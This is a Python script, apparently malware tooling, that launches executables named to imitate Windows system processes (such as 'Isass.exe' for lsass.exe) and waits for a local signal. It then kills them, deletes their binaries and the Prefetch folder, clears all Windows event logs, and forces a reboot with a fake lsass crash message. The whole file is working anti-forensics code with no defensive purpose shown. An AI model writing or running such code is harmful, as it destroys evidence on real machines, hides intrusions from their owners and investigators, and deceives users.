import subprocess
import time
import requests

subprocess.run("start wuasrv.exe -f 5633", shell=True)
time.sleep(10)
subprocess.run("start Isass.exe", shell=True)
time.sleep(5)
subprocess.run("start WMIHost.exe", shell=True)
time.sleep(10)

r = requests.get("http://127.0.0.1:5633/clean.txt")

cleanlogs = """cmd /c "for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"""""
restart = r'shutdown /r /t 120 /c "The system process “lsass.exe” terminated unexpectedly with status code -1073741819. The system will restart in 2 minute..."'

if r.status_code == 200:
    subprocess.run("TASKKILL /f /im Isass.exe", shell=True)
    time.sleep(1)
    subprocess.run("TASKKILL /f /im WMIHost.exe", shell=True)
    time.sleep(1)
    subprocess.run("TASKKILL /f /im wuasrv.exe", shell=True)
    time.sleep(1)
    subprocess.run("del /f /s /q C:\Windows\Help\mui\0563\DIAgnostic\*.exe")
    time.sleep(1)
    subprocess.run("del /f /s /q C:\Windows\Prefetch\*.*")
    time.sleep(1)
    subprocess.run(cleanlogs, shell=True)
    time.sleep(1)
    subprocess.run("sfc /scannow", shell=True)
    subprocess.run(restart, shell=True)

    
else:
    # Life is a mystery
    # Everyone must stand alone
    # I hear you call my name
    # And it feels like home
    #           Gunz for Hire - Like a prayer
    print("")